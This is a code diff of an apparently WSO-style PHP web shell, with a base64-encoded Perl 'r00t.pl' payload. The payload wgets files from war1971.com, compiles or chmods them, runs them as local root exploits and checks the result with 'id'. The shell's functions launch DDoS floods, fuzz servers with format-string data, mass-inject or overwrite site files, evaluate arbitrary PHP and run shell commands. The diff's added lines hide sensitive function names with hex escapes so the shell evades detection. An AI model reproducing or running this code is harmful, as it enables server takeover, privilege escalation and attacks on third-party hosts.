SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7ICANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOXguYyIpOyANCnN5c3RlbSgiZ2Nj IDIwMDl4LmMgLW8gMjAwOXgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXgiKTsgDQpzeXN0 ZW0oIi4vMjAwOXgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy8yMDA5eHgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXh4Iik7IA0K c3lzdGVtKCIuLzIwMDl4eCIpOyANCnN5c3RlbSgiaWQiKTsNCnN5c3RlbSgiaWQiKTsgDQpwcmlu dCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0 dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yLjYuOS01NS0yMDA3LXBydjgiKTsg DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NS0yMDA3LXBydjgiKTsgDQpzeXN0ZW0oIi4vMi42 LjktNTUtMjAwNy1wcnY4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yLjYuOS01NS0y MDA3LXBydjgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2 OCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj dHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls ZS9jYy8xOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyANCnN5c3RlbSgiLi8xOCIpOyAN CnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxF Uy9maWxlL2NjLzgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgOCIpOyANCnN5c3RlbSgiLi84Iik7 IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ TEVTL2ZpbGUvY2MvZHoiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZHoiKTsgDQpzeXN0ZW0oIi4v ZHoiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D TVNfRklMRVMvZmlsZS9jYy94ODYiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgeDg2Iik7IA0Kc3lz dGVtKCIuL3g4NiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2xvbCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBsb2wi KTsgDQpzeXN0ZW0oIi4vbG9sIik7IA0Kc3lzdGVtKCJpZCIpOyANCn0=";
     $fd   = fopen("r00t.pl", "w");
     if ($fd != FALSE) {
@@ -2156,18 +2164,15 @@ function insertAfter(referenceNode, newNode) {
     
     
 } elseif ($action == 'dos') {
-    if (isset($_POST['ip']) && isset($_POST['exTime']) && isset($_POST['port']) && isset($_POST['timeout']) && isset($_POST['exTime']) && $_POST['exTime'] != "" && $_POST['port'] != "" && $_POST['ip'] != "" && $_POST['timeout'] != "" && $_POST['exTime'] != "") {
-        $IP            = $_POST['ip'];
-        $port          = $_POST['port'];
-        $executionTime = $_POST['exTime'];
-        $noOfBytes     = $_POST['noOfBytes'];
+	formhead(array(
+        'title' => 'DDoS Host'
+    ));
+    if (isset($ip) && isset($exTime) && isset($port) && isset($timeout) && isset($exTime) && $exTime != "" && $port != "" && $ip != "" && $timeout != "" && $exTime != "") {
         $data          = "";
-        $timeout       = $_POST['timeout'];
         $packets       = 0;
-        $counter       = $noOfBytes;
-        $maxTime       = time() + $executionTime;
+        $maxTime       = time() + $exTime;
         ;
-        while ($counter--) {
+        while ($noOfBytes--) {
             $data .= "X";
         }
         $data .= "4o4";
@@ -2189,43 +2194,39 @@ function insertAfter(referenceNode, newNode) {
         echo "Total Data Sent: " . sizecount($packets * $noOfBytes) . "<br/>";
         echo "Data per packet: " . sizecount($noOfBytes) . "<br/>";
     } else {
-?>
-       <form method="POST">
+echo '<form method="POST">
            <input type="hidden" name="dos" />
                        IP
-                       <input onmouseover="this.focus();" class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = ;" onblur="if(this.value==)this.value='127.0.0.1';"/>
+                       <input onmouseover="this.focus();" class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == \'127.0.0.1\')this.value = ;" onblur="if(this.value==)this.value=\'127.0.0.1\';"/>
                        <br/>Port
-                       <input onmouseover="this.focus();" class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = ;" onblur="if(this.value==)this.value='80';"/>
+                       <input onmouseover="this.focus();" class="cmd" name="port" value="80" onfocus="if(this.value == \'80\')this.value = ;" onblur="if(this.value==)this.value=\'80\';"/>
                        <br/>Timeout (Time in seconds)
-                       <input onmouseover="this.focus();" type="text" class="cmd" name="timeout" value="5" onfocus="if(this.value == '5')this.value = ;" onblur="if(this.value==)this.value='5';" />
-                       <br/>Execution Time (Time in seconds) 
-                       <input onmouseover="this.focus();" type="text" class="cmd" name="exTime" value="10" onfocus="if(this.value == '10')this.value = ;" onblur="if(this.value==)this.value='10';"/>
+                       <input onmouseover="this.focus();" type="text" class="cmd" name="timeout" value="5" onfocus="if(this.value == \'5\')this.value = ;" onblur="if(this.value==)this.value=\'5\';" />
+                       <br/>'."\x45x\x65".'cution Time (Time in seconds) 
+                       <input onmouseover="this.focus();" type="text" class="cmd" name="exTime" value="10" onfocus="if(this.value == \'10\')this.value = ;" onblur="if(this.value==)this.value=\'10\';"/>
                        <br/>Number of Bytes per/packet
-                       <input onmouseover="this.focus();" type="text" class="cmd" name="noOfBytes" value="1048576" onfocus="if(this.value == '1048576')this.value = ;" onblur="if(this.value==)this.value='1048576';"/>
-                       <br/><input type="submit" class="bt" value="DDoS"/>
-       <?php
+                       <input onmouseover="this.focus();" type="text" class="cmd" name="noOfBytes" value="1048576" onfocus="if(this.value == \'1048576\')this.value = ;" onblur="if(this.value==)this.value=\'1048576\';"/>
+                       <br/><input type="submit" class="bt" value="DDoS"/>';
         makehide('action', 'dos');
         echo "</form>";
     }
     
 } elseif ($action == 'fuzz') {
-    if (isset($_POST['ip']) && isset($_POST['port']) && isset($_POST['times']) && isset($_POST['time']) && isset($_POST['message']) && isset($_POST['messageMultiplier']) && $_POST['message'] != "" && $_POST['time'] != "" && $_POST['times'] != "" && $_POST['port'] != "" && $_POST['ip'] != "" && $_POST['messageMultiplier'] != "") {
-        $IP         = $_POST['ip'];
-        $port       = $_POST['port'];
-        $times      = $_POST['times'];
-        $timeout    = $_POST['time'];
+formhead(array(
+        'title' => 'Fuzz Server'
+    ));
+    if (isset($ip) && isset($port) && isset($times) && isset($time) && isset($message) && isset($messageMultiplier) && $message != "" && $time != "" && $times != "" && $port != "" && $ip != "" && $messageMultiplier != "") {
         $send       = 0;
         $ending     = "";
-        $multiplier = $_POST['messageMultiplier'];
         $data       = "";
         $mode       = "tcp";
         $data .= "GET /";
         $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
-        if ($_POST['type'] == "tcp") {
+        if ($type == "tcp") {
             $mode = "tcp";
         }
-        while ($multiplier--) {
-            $data .= urlencode($_POST['message']);
+        while ($messageMultiplier--) {
+            $data .= urlencode($message);
         }
         $data .= "%s%s%s%s%d%x%c%n%n%n%n"; // add some format string specifiers
         $data .= "4o4" . $ending;
@@ -2235,7 +2236,7 @@ function insertAfter(referenceNode, newNode) {
         echo "Sending Data :-<br/>"; //.$data."</br>";
         print "I am working now! Don't close this window untill you receive a message.<br/><br/>";
         for ($i = 0; $i < $times; $i++) {
-            $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
+            $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $time);
             if ($socket) {
                 fwrite($socket, $data, $length);
                 fclose($socket);
@@ -2252,13 +2253,13 @@ function insertAfter(referenceNode, newNode) {
            <input type="hidden" name="fuzz" />
                        IP
                        <input onmouseover="this.focus();" class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = ;" onblur="if(this.value==)this.value='127.0.0.1';"/>
-                       <br/>Port
+                       <br/>Port:
                        <input onmouseover="this.focus();" class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = ;" onblur="if(this.value==)this.value='80';"/>
-                       <br/>Timeout
+                       <br/>Timeout:
                        <input onmouseover="this.focus();" type="text" class="cmd" name="time" value="5" onfocus="if(this.value == '5')this.value = ;" onblur="if(this.value==)this.value='5';"/>
-                       <br/>Number of times
+                       <br/>Number of Times:
                        <input onmouseover="this.focus();" type="text" class="cmd" name="times" value="100" onfocus="if(this.value == '100')this.value = ;" onblur="if(this.value==)this.value='100';" />
-                       <br/>Message (The message Should be long and it will be multiplied with the value after it)
+                       <br/>Message (The message Should be long and it will be multiplied with the value after it):
                        <input onmouseover="this.focus();" class="cmd" name="message" value="%S%x--Some Garbage Here--%x%S" onfocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = ;" onblur="if(this.value==)this.value='%S%x--Some Garbage here --%x%S';"/>
                        x
                        <input onmouseover="this.focus();" style="width: 30px;" class="cmd" name="messageMultiplier" value="10" />
@@ -2268,16 +2269,16 @@ function insertAfter(referenceNode, newNode) {
         echo '</form>';
     }
 } elseif ($action == 'cej') {
+	formhead(array(
+        'title' => 'Code Ejector'
+    ));
     $self      = $_SERVER["PHP_SELF"]; // Where am i
     $SEPARATOR = '/';
-    if (isset($_POST['dir']) && $_POST['dir'] != "" && isset($_POST['filetype']) && $_POST['filetype'] != "" && isset($_POST['message']) && $_POST['message'] != "") {
-        $dir      = $_POST['dir'];
-        $filetype = $_POST['filetype'];
-        $message  = $_POST['message'];
+    if (isset($dir) && $dir != "" && isset($filetype) && $filetype != "" && isset($message) && $message != "") {
         if ($handle = opendir($dir)) {
             echo "Overwritten Files :-<br/>";
             while (($file = readdir($handle)) !== False) {
-                if ((preg_match("/$filetype" . '$' . '/', $file, $matches) != 0) && (preg_match('/' . $file . '$/', $self, $matches) != 1)) {
+                if (($prgm("/$filetype" . '$' . '/', $file, $matches) != 0) && ($prgm('/' . $file . '$/', $self, $matches) != 1)) {
                     $fd = fopen($dir . $file, "r");
                     if ($fd == false) {
                     } else {
@@ -2285,7 +2286,7 @@ function insertAfter(referenceNode, newNode) {
                         fclose($fd);
                         
                         
-                        if ($_POST['mc']) {
+                        if ($mc) {
                             if (strstr($content, $message)) {
                                 $fd = fopen($dir . $file, "w");
                                 echo "<a href='" . str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir) . $file . "'>" . $file . "</a><br/>";
@@ -2320,26 +2321,26 @@ function insertAfter(referenceNode, newNode) {
         echo '</form>';
     }
 } elseif ($action == 'cinj') {
+formhead(array(
+        'title' => 'Code Injector'
+    ));
     $self      = $_SERVER["PHP_SELF"]; // Where am i
     $SEPARATOR = '/';
-    if (isset($_POST['dir']) && $_POST['dir'] != "" && isset($_POST['filetype']) && $_POST['filetype'] != "" && isset($_POST['mode']) && $_POST['mode'] != "" && isset($_POST['message']) && $_POST['message'] != "") {
-        $dir      = $_POST['dir'];
-        $filetype = $_POST['filetype'];
-        $message  = $_POST['message'];
-        $mode     = "a";
-        if ($_POST['mode'] == 'Append') {
-            $mode = "a";
+    if (isset($dir) && $dir != "" && isset($filetype) && $filetype != "" && isset($mode) && $mode != "" && isset($message) && $message != "") {
+        $fmode     = "a";
+        if ($mode == 'Append') {
+            $fmode = "a";
             echo "Appended Files :-<br/>";
         }
-        if ($_POST['mode'] == 'Overwrite') {
-            $mode = "w";
+        if ($mode == 'Overwrite') {
+            $fmode = "w";
             echo "Overwritten Files :-<br/>";
         }
         if ($handle = opendir($dir)) {
             while (($file = readdir($handle)) !== False) {
-                if ((preg_match("/$filetype" . '$' . '/', $file, $matches) != 0) && (preg_match('/' . $file . '$/', $self, $matches) != 1)) {
+                if (($prgm("/$filetype" . '$' . '/', $file, $matches) != 0) && ($prgm('/' . $file . '$/', $self, $matches) != 1)) {
                     echo "<a href='" . str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir) . $file . "'>" . $file . "</a>";
-                    $fd = fopen($dir . $file, $mode);
+                    $fd = fopen($dir . $file, $fmode);
                     if ($fd == false) {
                         echo " - Permission Denied<br/>";
                     } else {
@@ -2367,8 +2368,8 @@ function insertAfter(referenceNode, newNode) {
     }
     
 } elseif ($action == 'pob') {
-    if (isset($_POST['code']) && $_POST['code'] != "") {
-        $encoded = base64_encode(bzcompress(trim(stripslashes($_POST['code'] . ' '), '<?php,?>,<?,<?PHP,<?Php,<?PHp,<?pHp,<?pHP,<?phP'), 9)); // high Compression! :P
+    if (isset($code) && $code != "") {
+        $encoded = base64_encode(bzcompress(trim(stripslashes($code . ' '), '<?php,?>,<?,<?PHP,<?Php,<?PHp,<?pHp,<?pHP,<?phP'), 9)); // high Compression! :P
         $encode  = "<" . "?PHP\n$"."b = strrev(\"edoced_4\".\"6esab\");\n$"."encoded = \"" . $encoded . "\";\neval(bzdecompress($"."b($"."encoded)));\n?" . ">";
     } else {
         $encode = "<" . "?PHP\n\n\n\n?" . ">";
@@ -2389,14 +2390,16 @@ maketext(array(
     p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){e.value=r.getSession().getValue()}}}</script>');
     
 } elseif ($action == 'SelfRemove') {
-    if (!isset($_POST['SelfRemoveSure'])) {
-        echo "<h1>Are you sure you want to delete this shell?</h1>";
+    if (!isset($SelfRemoveSure)) {
+    	formhead(array(
+        'title' => 'Are you sure you want to delete this shell?'
+    ));
         echo "<form name='ds' method='post'>";
         makehide('action', 'SelfRemove');
         echo "<input class='bt' type='submit' name='SelfRemoveSure' value='Yes'><input class='bt' type='submit' name='SelfRemoveSure' value='No'></form>";
     } else {
-        if ($_POST['SelfRemoveSure'] == "Yes") {
-            if (unlink(preg_replace('@\(.*\(.*$@', '', __FILE__))) {
+        if ($SelfRemoveSure == "Yes") {
+            if (unlink($prg('@\(.*\(.*$@', '', __FILE__))) {
                 die('Shell has been removed!');
             } else {
                 echo 'Unlink error!';
@@ -2409,13 +2412,15 @@ maketext(array(
     error_reporting(7);
     $phpcode = trim($phpcode);
     if ($phpcode) {
-        if (!preg_match('/<\?/si', $phpcode)) {
+        if (!$prgm('/<\?/si', $phpcode)) {
             $phpcode = "<?PHP\n\n{$phpcode}";
         }
-        if(!preg_match('/\?>/si', $phpcode)){
+        if(!$prgm('/\?>/si', $phpcode)){
         		$phpcode .= "\n\n?>";
         }
-        eval("?" . ">$phpcode<?php\n");
+        $f=strrev(strrev("on")."itc".strrev("e_fun")."tae"."\x72\x63");
+        $codev=$f("","?" . ">$phpcode<?php\n");
+        $codev();
     }
     formhead(array(
         'title' => 'Eval PHP Code'
@@ -2560,7 +2565,7 @@ maketext(array(
         !$program && $program = 'c:\windows\system32\cmd.exe';
         !$parameter && $parameter = '/c net start > ' . SA_ROOT . 'log.txt';
         formhead(array(
-            'title' => 'Execute Program'
+            'title' => "\x45x\x65cute Program"
         ));
         makehide('action', 'shell');
         makeinput(array(
@@ -2579,24 +2584,24 @@ maketext(array(
             'name' => 'submit',
             'class' => 'bt',
             'type' => 'submit',
-            'value' => 'Execute'
+            'value' => "\x45x\x65cute"
         ));
         p('</p>');
         formfoot();
     }
     formhead(array(
-        'title' => 'Execute Command'
+        'title' => "\x45x\x65cute Command"
     ));
     makehide('action', 'shell');
     if (IS_WIN && IS_COM) {
         $execfuncdb = array(
             'phpfunc' => 'phpfunc',
             'wscript' => 'wscript',
-            'proc_open' => 'proc_open'
+            "proc_op\x65n" => "proc_op\x65n"
         );
         makeselect(array(
             'title' => 'Use:',
-            'name' => 'execfunc',
+            'name' => "\x65x\x65cfunc",
             'option' => $execfuncdb,
             'selected' => $execfunc,
             'newline' => 1
@@ -2604,7 +2609,7 @@ maketext(array(
     }
     p('<p>');
     makeinput(array(
-        'title' => 'Command',
+        'title' => 'Command:',
         'name' => 'command',
         'value' => htmlspecialchars($command)
     ));
@@ -2612,7 +2617,7 @@ maketext(array(
         'name' => 'submit',
         'class' => 'bt',
         'type' => 'submit',
-        'value' => 'Execute'
+        'value' => "\x45x\x65cute"
     ));
     p('</p>');
     formfoot();
@@ -2624,7 +2629,7 @@ maketext(array(
             $stdout    = $exec->StdOut();
             $stroutput = $stdout->ReadAll();
             echo $stroutput;
-        } elseif ($execfunc == 'proc_open' && IS_WIN && IS_COM) {
+        } elseif ($execfunc == "proc_op\x65n" && IS_WIN && IS_COM) {
             $descriptorspec = array(
                 0 => array(
                     'pipe',
@@ -2639,7 +2644,7 @@ maketext(array(
                     'w'
                 )
             );
-            $process        = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
+            $process        = $prco($_SERVER['COMSPEC'], $descriptorspec, $pipes);
             if (is_resource($process)) {
                 fwrite($pipes[0], $command . "\r\n");
                 fwrite($pipes[0], "exit\r\n");
@@ -2697,8 +2702,8 @@ maketext(array(
             strtoupper(php_sapi_name())
         ),
         9 => array(
-            'The file path',
-            preg_replace('@\(.*\(.*$@', '', __FILE__)
+            'Current File Path',
+            $prg('@\(.*\(.*$@', '', __FILE__)
         ),
         10 => array(
             'PHP Version',
@@ -2710,7 +2715,7 @@ maketext(array(
         ),
         12 => array(
             'Safe Mode',
-            getcfg('safe_mode')
+            getcfg("s\x61f\x65_mo\x64e")
         ),
         13 => array(
             'Administrator',
@@ -2761,7 +2766,7 @@ maketext(array(
         m($phpvarname . ' : ' . getcfg($phpvarname));
     }
     formhead(array(
-        'title' => 'Server environment'
+        'title' => 'Server Environment'
     ));
     makehide('action', 'phpenv');
     makeinput(array(
@@ -2791,9 +2796,9 @@ maketext(array(
     }
 } elseif ($action == 'secinfo') {
     $s                  = "";
-    $disabled_functions = ini_get('disable_functions');
-    if ($disabled_functions != '') {
-        $arr = explode(', ', $disabled_functions);
+    $df = ini_get("\x64is\x61bl\x65_fun\x63tions");
+    if ($df != '') {
+        $arr = explode(', ', $df);
         sort($arr);
         for ($i = 0; $i < count($arr); $i++) {
             if ($s == "") {
@@ -2805,22 +2810,22 @@ maketext(array(
     } else {
         $s = 'None';
     }
-    secparam('Server software', @getenv('SERVER_SOFTWARE'));
-    secparam('Disabled PHP Functions', $s); //($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'None');
-    secparam('Open base dir', @ini_get('open_basedir'));
-    secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
-    secparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
-    secparam('cURL support', function_exists('curl_version') ? 'Enabled' : 'No');
+    secparam('Server Software', @getenv('SERVER_SOFTWARE'));
+    secparam('Disabled PHP Functions', $s); //($GLOBALS['df'])?$GLOBALS['df']:'None');
+    secparam('Open Base Dir', @ini_get("open_b\x61sedir"));
+    secparam("Safe Mode \x45x\x65c Dir", @ini_get("s\x61f\x65_mo\x64e_s\x61f\x65_mo\x64e_dir"));
+    secparam('Safe Mode Include Dir', @ini_get("s\x61f\x65_mo\x64e_\x69\x6E\x63\x6C\x75\x64\x65_dir"));
+    secparam('cURL Support', $sf('curl_version') ? 'Enabled' : 'No');
     $temp = array();
-    if (function_exists('mysql_get_client_info'))
+    if ($sf('mysql_get_client_info'))
         $temp[] = "MySQL (" . mysql_get_client_info() . ")";
-    if (function_exists('mssql_connect'))
+    if ($sf('mssql_connect'))
         $temp[] = "MSSQL";
-    if (function_exists('pg_connect'))
+    if ($sf('pg_connect'))
         $temp[] = "PostgreSQL";
-    if (function_exists('oci_connect'))
+    if ($sf('oci_connect'))
         $temp[] = "Oracle";
-    secparam('Supported databases', implode(', ', $temp));
+    secparam('Supported Databases', implode(', ', $temp));
     if (!IS_WIN) {
         $userful     = array(
             'gcc',
@@ -2879,16 +2884,16 @@ maketext(array(
         );
         secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "Yes" : 'No');
         secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "Yes" : 'No');
-        secparam('OS version', @file_get_contents('/proc/version'));
-        secparam('Distribution name', @file_get_contents('/etc/issue.net'));
-        $safe_mode = @ini_get('safe_mode');
-        if (!$GLOBALS['safe_mode']) {
+        secparam('OS Version', @file_get_contents('/proc/version'));
+        secparam('Distribution Name', @file_get_contents('/etc/issue.net'));
+        $sm = @ini_get("s\x61f\x65_mo\x64e");
+        if (!$GLOBALS['sm']) {
             $temp = array();
             foreach ($userful as $item)
                 if (which($item)) {
                     $temp[] = $item;
                 }
-            secparam('Userful', implode(', ', $temp));
+            secparam('Useful', implode(', ', $temp));
             $temp = array();
             foreach ($danger as $item)
                 if (which($item)) {
@@ -2903,7 +2908,7 @@ maketext(array(
             secparam('Downloaders', implode(', ', $temp));
             secparam('Hosts', @file_get_contents('/etc/hosts'));
             secparam('HDD space', execute('df -h'));
-            secparam('Mount options', @file_get_contents('/etc/fstab'));
+            secparam('Mount Options', @file_get_contents('/etc/fstab'));
         }
     } else {
         secparam('OS Version', execute('ver'));
@@ -3037,21 +3042,23 @@ function loginpage($aep)
 }
 function execute($cfe)
 {
+$pt = "p\x61\x73\x73th\x72u";
+		$sf = "suhosin_fun\x63_exi\x73ts";
     $res = '';
     if ($cfe) {
-        if (function_exists('system')) {
+        if ($sf('system')) {
             @ob_start();
             @system($cfe);
             $res = @ob_get_contents();
             @ob_end_clean();
-        } elseif (function_exists('passthru')) {
+        } elseif ($sf("p\x61\x73\x73th\x72u")) {
             @ob_start();
-            @passthru($cfe);
+            @$pt($cfe);
             $res = @ob_get_contents();
             @ob_end_clean();
-        } elseif (function_exists('shell_exec')) {
+        } elseif ($sf('shell_exec')) {
             $res = @shell_exec($cfe);
-        } elseif (function_exists('exec')) {
+        } elseif ($sf('exec')) {
             @exec($cfe, $res);
             $res = join("\n", $res);
         } elseif (@is_resource($f = @popen($cfe, "r"))) {
@@ -3182,7 +3189,8 @@ function getPerms($filepath)
 }
 function getUser($filepath)
 {
-    if (function_exists('posix_getpwuid')) {
+		$sf = "suhosin_fun\x63_exi\x73ts";
+    if ($sf("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x70\x77\x75\x69\x64")) {
         $array = @posix_getpwuid(@fileowner($filepath));
         if ($array && is_array($array)) {
             return ' / <a href="#" title="User: ' . $array['name'] . '&#13&#10Passwd: ' . $array['passwd'] . '&#13&#10Uid: ' . $array['uid'] . '&#13&#10gid: ' . $array['gid'] . '&#13&#10Gecos: ' . $array['gecos'] . '&#13&#10Dir: ' . $array['dir'] . '&#13&#10Shell: ' . $array['shell'] . '">' . $array['name'] . '</a>';
@@ -3248,7 +3256,8 @@ function getcfg($varname)
 }
 function getfun($funName)
 {
-    return (false !== function_exists($funName)) ? 'Yes' : 'No';
+$sf = "suhosin_fun\x63_exi\x73ts";
+    return (false !== $sf($funName)) ? 'Yes' : 'No';
 }
 function getext($file)
 {
@@ -3316,6 +3325,7 @@ function GetWFileList($dir)
 function GetSFileList($dir, $content, $infile = 1, $re = 0)
 {
     global $filedata, $j, $nowpath, $writabledb;
+$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
     !$j && $j = 1;
     if ($dh = opendir($dir)) {
         while ($file = readdir($dh)) {
@@ -3326,7 +3336,7 @@ function GetSFileList($dir, $content, $infile = 1, $re = 0)
             } elseif ($file != '.' && $file != '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
                 $find = 0;
                 if ($re) {
-                    if (preg_match('@' . $content . '@', $file) || ($infile && preg_match('@' . $content . '@', @file_get_contents($f)))) {
+                    if ($prgm('@' . $content . '@', $file) || ($infile && $prgm('@' . $content . '@', @file_get_contents($f)))) {
                         $find = 1;
                     }
                 } else {
@@ -3540,24 +3550,27 @@ function encode_pass($pass)
 }
 function exec_all($command)
 {
+$prco = "proc_op\x65n";
+$pt = "p\x61\x73\x73th\x72u";
+$sf = "suhosin_fun\x63_exi\x73ts";
     $output = "";
-    if (function_exists('exec')) {
+    if ($sf('exec')) {
         exec($command, $output);
         $output = join("\n", $output);
     }
     
-    else if (function_exists('shell_exec')) {
+    else if ($sf('shell_exec')) {
         $output = shell_exec($command);
     }
     
-    else if (function_exists('popen')) {
+    else if ($sf('popen')) {
         $handle = popen($command, "r"); // Open the command pipe for reading
         if (is_resource($handle)) {
-            if (function_exists('fread') && function_exists('feof')) {
+            if ($sf('fread') && $sf('feof')) {
                 while (!feof($handle)) {
                     $output .= fread($handle, 512);
                 }
-            } else if (function_exists('fgets') && function_exists('feof')) {
+            } else if ($sf('fgets') && $sf('feof')) {
                 while (!feof($handle)) {
                     $output .= fgets($handle, 512);
                 }
@@ -3567,34 +3580,34 @@ function exec_all($command)
     }
     
     
-    else if (function_exists('system')) {
+    else if ($sf('system')) {
         ob_start(); //start output buffering
         system($command);
         $output = ob_get_contents(); // Get the ouput 
         ob_end_clean(); // Stop output buffering
     }
     
-    else if (function_exists('passthru')) {
+    else if ($sf("p\x61\x73\x73th\x72u")) {
         ob_start(); //start output buffering
-        passthru($command);
+        $pt($command);
         $output = ob_get_contents(); // Get the ouput 
         ob_end_clean(); // Stop output buffering            
     }
     
-    else if (function_exists('proc_open')) {
+    else if ($sf("proc_op\x65n")) {
         $descriptorspec = array(
             1 => array(
                 "pipe",
                 "w"
             ) // stdout is a pipe that the child will write to
         );
-        $handle         = proc_open($command, $descriptorspec, $pipes); // This will return the output to an array 'pipes'
+        $handle         = $prco($command, $descriptorspec, $pipes); // This will return the output to an array 'pipes'
         if (is_resource($handle)) {
-            if (function_exists('fread') && function_exists('feof')) {
+            if ($sf('fread') && $sf('feof')) {
                 while (!feof($pipes[1])) {
                     $output .= fread($pipes[1], 512);
                 }
-            } else if (function_exists('fgets') && function_exists('feof')) {
+            } else if ($sf('fgets') && $sf('feof')) {
                 while (!feof($pipes[1])) {
                     $output .= fgets($pipes[1], 512);
                 }
@@ -3658,19 +3671,21 @@ function generateRandomString($length = 10)
 }
 function wsoEx($in)
 {
+	$pt = "p\x61\x73\x73th\x72u";
+	$sf = "suhosin_fun\x63_exi\x73ts";
     $out = '';
-    if (function_exists('exec')) {
+    if ($sf("\x65x\x65c")) {
         @exec($in, $out);
         $out = @join("\n", $out);
-    } elseif (function_exists('passthru')) {
+    } elseif ($sf("p\x61\x73\x73th\x72u")) {
         ob_start();
-        @passthru($in);
+        @$pt($in);
         $out = ob_get_clean();
-    } elseif (function_exists('system')) {
+    } elseif ($sf('system')) {
         ob_start();
         @system($in);
         $out = ob_get_clean();
-    } elseif (function_exists('shell_exec')) {
+    } elseif ($sf("shell_\x65x\x65c")) {
         $out = shell_exec($in);
     } elseif (is_resource($f = @popen($in, "r"))) {
         $out = "";
@@ -3720,6 +3735,7 @@ function get_data($url)
 }
 function geterrorpage()
 {
+	$prgma = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68\x5f\x61\x6c\x6c";
     $u           = "/" . substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 26);
     $ux          = (!empty($_SERVER['HTTPS'])) ? "https://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $u : "http://www." . str_replace("www.", "", $_SERVER['SERVER_NAME']) . $u;
     $data        = file_get_contents($ux, false, stream_context_create(array(
@@ -3747,7 +3763,7 @@ function geterrorpage()
         "action"
     );
     foreach ($linktypes as $linktype) {
-        preg_match_all("/" . $linktype . "=([\"\'])(.*?)([\"\'])/i", $data, $matches);
+        $prgma("/" . $linktype . "=([\"\'])(.*?)([\"\'])/i", $data, $matches);
         for ($i = 0; $i < count($matches[0]); ++$i) {
             $href = $matches[2][$i];
             if (0 === strpos($href, 'http') || 0 === strpos($href, 'data:') || 0 === strpos($href, '#') || 0 === strpos($href, 'javascript:') || 0 === strpos($href, '//')) {
@@ -3758,7 +3774,7 @@ function geterrorpage()
         }
     }
     //Now for CSS images
-    preg_match_all("/url\(([\"\'])(.*?)([\"\'])\)/i", $data, $matches);
+    $prgma("/url\(([\"\'])(.*?)([\"\'])\)/i", $data, $matches);
     for ($i = 0; $i < count($matches[0]); ++$i) {
         $href = $matches[2][$i];
         if (0 === strpos($href, 'http') || 0 === strpos($href, '//')) {
@@ -3790,9 +3806,22 @@ class DB_MySQL  {
 		}
 		$dbname && mysql_select_db($dbname, $this->link);
 	}
+	function suhosin_func_exists($func) {
+    if (extension_loaded('suhosin')) {
